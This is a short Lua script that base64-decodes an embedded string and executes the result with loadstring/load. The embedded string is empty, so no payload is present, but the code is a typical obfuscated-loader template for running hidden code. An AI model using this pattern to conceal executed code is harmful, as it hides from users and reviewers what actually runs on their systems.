local v0,v1,v2,v3,v4=0;local _Xwn='';local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';local res=(_Xwn:gsub('=',''):gsub('.',function(x)local r,f='',b:find(x)-1;for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end;return r;end):gsub('%d%d%d%d%d%d%d%d',function(x)if(#x~=8)then return''end;local c=0;for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end;return string.char(c)end));return assert(loadstring or load)(res)()
